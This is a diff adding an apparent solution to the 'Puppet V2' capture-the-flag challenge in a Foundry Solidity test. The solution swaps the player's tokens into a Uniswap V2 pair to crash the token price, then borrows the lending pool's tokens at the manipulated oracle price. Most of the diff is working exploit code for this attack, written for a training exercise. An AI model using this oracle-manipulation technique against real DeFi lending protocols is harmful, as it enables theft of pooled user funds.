@@ -5,6 +5,7 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
 import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
+import {UniswapV2Library} from "../../src/puppet-v2/UniswapV2Library.sol";
 import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
 import {WETH} from "solmate/tokens/WETH.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
@@ -98,7 +99,81 @@ contract PuppetV2Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV2() public checkSolvedByPlayer {
-        
+        weth.deposit{value: player.balance}();
+        address[] memory dvtToWeth = new address[](2);
+        dvtToWeth[0] = address(token);
+        dvtToWeth[1] = address(weth);
+
+        token.approve(address(uniswapV2Router), token.balanceOf(player));
+        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens({
+            amountIn: PLAYER_INITIAL_TOKEN_BALANCE,
+            amountOutMin: 1,
+            path: dvtToWeth,
+            to: player,
+            deadline: block.timestamp + 2
+        });
+
+        uint256 amount = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE / 2);
+        console.log("need: %d", amount);
+        console.log("weth balance %d", weth.balanceOf(player));
+
+        weth.approve(address(lendingPool), amount);
+        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE / 2);
+        console.log("dvt balance %d", token.balanceOf(player));
+
+        token.approve(address(uniswapV2Router), token.balanceOf(player));
+        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens({
+            amountIn: token.balanceOf(player),
+            amountOutMin: 1,
+            path: dvtToWeth,
+            to: player,
+            deadline: block.timestamp + 2
+        });
+
+        amount = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE / 4);
+        console.log("need: %d", amount);
+        console.log("weth balance %d", weth.balanceOf(player));
+
+        weth.approve(address(lendingPool), amount);
+        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE / 4);
+        console.log("dvt balance %d", token.balanceOf(player));
+
+        amount = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE / 4);
+        console.log("need: %d", amount);
+        console.log("weth balance %d", weth.balanceOf(player));
+
+        weth.approve(address(lendingPool), amount);
+        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE / 4);
+        console.log("dvt balance %d", token.balanceOf(player));
+
+        (uint256 reservesWETH, uint256 reservesToken) = UniswapV2Library.getReserves({
+            factory: address(uniswapV2Factory),
+            tokenA: address(weth),
+            tokenB: address(token)
+        });
+        console.log(reservesWETH, reservesToken);
+
+        address[] memory wethToDvt = new address[](2);
+        wethToDvt[0] = address(weth);
+        wethToDvt[1] = address(token);
+
+        weth.approve(address(uniswapV2Router), type(uint256).max);
+        uniswapV2Router.swapExactTokensForTokens(weth.balanceOf(player), 0, wethToDvt, player, block.timestamp + 2);
+
+        console.log("dvt balance %d", token.balanceOf(player));
+
+        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
+    }
+
+    function getPrice(address _token, uint256 amount) private view returns (uint256) {
+        (uint256 reservesWETH, uint256 reservesToken) = UniswapV2Library.getReserves({
+            factory: address(uniswapV2Factory),
+            tokenA: address(weth),
+            tokenB: address(token)
+        });
+        return _token == address(token)
+            ? UniswapV2Library.quote({amountA: amount * 10 ** 18, reserveA: reservesToken, reserveB: reservesWETH})
+            : UniswapV2Library.quote({amountA: amount * 10 ** 18, reserveA: reservesWETH, reserveB: reservesToken});
     }
 
     /**
